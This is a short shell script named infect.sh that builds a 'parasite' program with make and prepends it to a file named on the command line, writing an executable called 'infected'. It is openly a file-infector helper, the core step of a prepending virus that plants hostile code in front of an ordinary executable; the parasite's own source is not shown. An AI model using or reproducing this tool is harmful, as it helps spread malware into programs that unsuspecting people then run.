#!/bin/sh

if [ ! $1 ]; then
	echo "usage: infect.sh <filename>"
	exit
fi

if [ ! -e ./parasite ]; then
	make
fi

if [ ! -e $1 ]; then
	echo "$1 does not exist"
	exit
fi
 
cat parasite $1 > infected
chmod +x infected

echo "done. peep ./infected"
